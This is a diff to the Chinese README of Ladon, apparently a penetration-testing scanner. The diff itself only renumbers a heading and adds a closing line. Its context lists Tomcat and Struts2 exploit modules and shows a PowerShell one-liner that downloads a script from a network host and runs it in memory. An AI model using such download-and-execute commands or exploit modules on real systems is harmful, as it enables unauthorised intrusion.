@@ -179,7 +179,7 @@ ID | 模块名称 |  功能说明
 7 | TomcatExp 	|	Tomcat漏洞利用(CVE-2017-12615)<br>
 8 | Struts2Poc	|	Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)<br>
 
-#### 0x006 加密解密
+#### 0x005 加密解密
 例子: Ladon 字符串 EnHex<br>
 例子: Ladon EnHex (批量str.txt)<br>
 
@@ -320,3 +320,5 @@ PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模
 > powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
 ```
 <img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
+
+End!!!
